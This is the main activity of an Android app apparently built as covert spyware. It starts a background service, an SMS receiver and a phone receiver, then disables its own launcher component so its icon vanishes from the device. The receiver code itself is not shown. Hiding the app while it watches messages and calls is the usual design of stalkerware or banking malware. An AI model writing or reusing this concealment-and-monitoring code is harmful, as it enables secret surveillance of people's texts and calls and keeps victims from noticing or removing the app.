package ooo.xxx.okhelper;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import ooo.xxx.okhelper.Receiver.PhoneReceiver;
import ooo.xxx.okhelper.Receiver.SMSReceiver;
import ooo.xxx.okhelper.services.MyService;

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		
		init();
		
		HideMysehlf();
	}


/**
 * 初始化各模块	
 */
	private void init(){
		Intent service = new Intent();
		service.setClass(this, MyService.class);
		startService(service);
		
		
		Intent sms = new Intent();
		sms.setClass(this, SMSReceiver.class);
		startService(sms);
		
		Intent phone = new Intent();
		phone.setClass(this, PhoneReceiver.class);
		startService(phone);		
	}
	
	/**
	 * 隐藏自身图标
	 */
	private void HideMysehlf(){
		PackageManager p = getPackageManager();
		p.setComponentEnabledSetting(getComponentName(),
				PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
				PackageManager.DONT_KILL_APP);
		finish();
	}
}
